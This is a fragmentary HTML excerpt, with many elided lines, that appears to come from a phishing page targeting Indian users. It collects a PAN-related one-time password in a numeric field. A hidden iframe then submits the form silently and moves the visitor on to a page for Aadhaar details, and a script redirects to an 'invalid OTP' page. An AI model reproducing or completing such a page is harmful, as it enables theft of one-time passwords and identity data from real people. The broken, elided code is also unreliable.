   ...
   <body onload="startTimer();" style="background:#fff;">
    ...
    <img src="Menu.png" id="ii" width="10%">
      ...
      <section class="">
         ...
         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Aadhar_Details.php';}"></iframe>
         <!--My Form-->
                  ...
                  <div class="col-md-6 col-xs-12">
				   <div class="progress">
                     ...
                     <div class="p-50">
                        ...
                        <div class="login-box">
                        <div class="user-box">
                        <input type="text" name="Inv_PAN_OTP" inputmode="numeric" maxlength="8"
                        ...
                        window.location.href="Invalid_OTP_PAN.php";
                        }
                        }
                        </script>
